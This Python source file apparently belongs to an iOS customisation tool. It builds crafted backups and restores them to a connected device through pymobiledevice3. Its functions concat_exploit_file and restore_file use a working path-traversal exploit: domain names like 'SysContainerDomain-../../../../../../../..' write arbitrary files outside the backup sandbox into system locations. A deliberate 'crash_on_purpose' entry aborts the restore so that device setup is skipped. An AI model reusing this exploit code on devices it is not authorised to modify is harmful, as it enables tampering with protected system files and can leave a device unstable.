from . import backup, perform_restore
from pymobiledevice3.lockdown import LockdownClient
import os

class FileToRestore:
    def __init__(self, contents: str, restore_path: str, domain: str = None, owner: int = 501, group: int = 501):
        self.contents = contents
        self.restore_path = restore_path
        self.domain = domain
        self.owner = owner
        self.group = group

class AppBundleToRestore(FileToRestore):
    def __init__(self, bundle_id: str, bundle_version: str, bundle_path: str, container_content_class: str):
        super().__init__(contents=None, restore_path=bundle_path, domain=f"AppDomain-{bundle_id}")
        self.bundle_id = bundle_id
        self.bundle_version = bundle_version
        self.container_content_class = container_content_class

def concat_exploit_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str) -> str:
    base_path = "/var/backup"
    # set it to work in the separate volumes (prevents a bootloop)
    if file.restore_path.startswith("/var/mobile/"):
        # required on iOS 17.0+ since /var/mobile is on a separate partition
        base_path = "/var/mobile/backup"
    elif file.restore_path.startswith("/private/var/mobile/"):
        base_path = "/private/var/mobile/backup"
    elif file.restore_path.startswith("/private/var/"):
        base_path = "/private/var/backup"
    # don't append the directory if it has already been added (restore will fail)
    path, name = os.path.split(file.restore_path)
    domain_path = f"SysContainerDomain-../../../../../../../..{base_path}{path}/"
    new_last_domain = last_domain
    if last_domain != domain_path:
        files_list.append(backup.Directory(
            "",
            f"{domain_path}",
            owner=file.owner,
            group=file.group
        ))
        new_last_domain = domain_path
    files_list.append(backup.ConcreteFile(
        "",
        f"{domain_path}{name}",
        owner=file.owner,
        group=file.group,
        contents=file.contents
    ))
    return new_last_domain

def concat_regular_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str, last_path: str):
    path, name = os.path.split(file.restore_path)
    paths = path.split("/")
    new_last_domain = last_domain
    # append the domain first
    if last_domain != file.domain:
        files_list.append(backup.Directory(
            "",
            file.domain,
            owner=file.owner,
            group=file.group
        ))
        new_last_domain = file.domain
    # append each part of the path if it is not already there
    full_path = ""
    for path_item in paths:
        if full_path != "":
            full_path += "/"
        full_path += path_item
        if not last_path.startswith(full_path):
            files_list.append(backup.Directory(
                full_path,
                file.domain,
                owner=file.owner,
                group=file.group
            ))
            last_path = full_path
    # finally, append the file
    files_list.append(backup.ConcreteFile(
        f"{full_path}/{name}",
        file.domain,
        owner=file.owner,
        group=file.group,
        contents=file.contents
    ))
    return new_last_domain, full_path

# files is a list of FileToRestore objects
def restore_files(files: list, reboot: bool = False, lockdown_client: LockdownClient = None):
    # create the files to be backed up
    files_list = [
    ]
    apps_list = []
    sorted_files = sorted(files, key=lambda x: x.restore_path, reverse=False)
    # add the file paths
    last_domain = ""
    last_path = ""
    exploit_only = True
    for file in sorted_files:
        if isinstance(file, AppBundleToRestore):
            # add bundle id to the manifest
            apps_list.append(backup.AppBundle(
                identifier=file.bundle_id,
                path=file.restore_path,
                container_content_class=file.container_content_class,
                version=file.bundle_version
            ))
        elif file.domain == None:
            last_domain = concat_exploit_file(file, files_list, last_domain)
        else:
            last_domain, last_path = concat_regular_file(file, files_list, last_domain, last_path)
            exploit_only = False

    # crash the restore to skip the setup (only works for exploit files)
    if exploit_only:
        files_list.append(backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""))

    # create the backup
    back = backup.Backup(files=files_list, apps=apps_list)

    perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client)


# DEPRECIATED
def restore_file(fp: str, restore_path: str, restore_name: str, reboot: bool = False, lockdown_client: LockdownClient = None):
    # open the file and read the contents
    contents = open(fp, "rb").read()

    base_path = "/var/backup"
    if restore_path.startswith("/var/mobile/"):
        # required on iOS 17.0+ since /var/mobile is on a separate partition
        base_path = "/var/mobile/backup"

    # create the backup
    back = backup.Backup(files=[
        # backup.Directory("", "HomeDomain"),
        # backup.Directory("Library", "HomeDomain"),
        # backup.Directory("Library/Preferences", "HomeDomain"),
        # backup.ConcreteFile("Library/Preferences/temp", "HomeDomain", owner=501, group=501, contents=contents, inode=0),
        backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../..{base_path}{restore_path}",
                owner=501,
                group=501
            ),
        backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../..{base_path}{restore_path}{restore_name}",
                owner=501,
                group=501,
                contents=contents#b"",
                # inode=0
            ),
        # backup.ConcreteFile(
        #         "",
        #         "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
        #         owner=501,
        #         group=501,
        #         contents=b"",
        #     ),  # Break the hard link
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ])

    
    perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client)